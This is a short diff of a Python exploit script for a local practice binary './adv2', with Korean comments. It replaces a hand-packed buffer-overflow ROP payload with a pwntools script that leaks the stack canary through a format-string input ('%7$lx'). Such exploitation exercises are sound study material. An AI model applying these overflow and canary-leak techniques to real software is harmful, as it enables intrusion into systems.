@@ -1,11 +1,8 @@
-import sys
-import struct
+from pwn import *    # pwntools 라이브러리
 
-payload  = b"A"*40
-payload += struct.pack("<Q", 0x401146)
-payload += struct.pack("<Q", 0xdead)
-payload += struct.pack("<Q", 0x401149)
-payload += struct.pack("<Q", 0xbeef)
-payload += struct.pack("<Q", 0x40114c)
+p = process('./adv2')
 
-sys.stdout.buffer.write(payload)
+# Phase 1: canary leak
+p.sendlineafter(b'name? ', b'%7$lx')   # offset은 직접 찾을 것
+canary = int(p.recvline().strip(), 16)
+print(f"Leaked canary: {hex(canary)}")
